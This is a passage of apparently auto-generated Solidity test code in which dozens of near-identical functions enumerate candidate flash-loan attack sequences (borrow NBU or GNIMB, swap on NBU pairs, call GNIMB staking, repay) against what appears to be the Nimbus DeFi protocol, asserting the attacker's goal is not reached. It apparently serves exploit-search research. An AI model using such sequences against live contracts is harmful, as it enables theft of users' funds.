        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2423(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2424(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2425(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2426(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2427(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2428(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2429(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2430(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2431(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2432(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2433(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2434(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2435(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2436(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2437(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2438(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2439(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2440(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2441(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2442(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2443(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2444(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2445(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2446(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2447(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2448(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2449(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2450(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2451(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2452(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2453(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2454(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2455(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2456(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2457(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2458(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2459(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2460(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2461(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2462(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2463(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2464(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2465(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2466(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2467(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2468(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2469(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2470(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
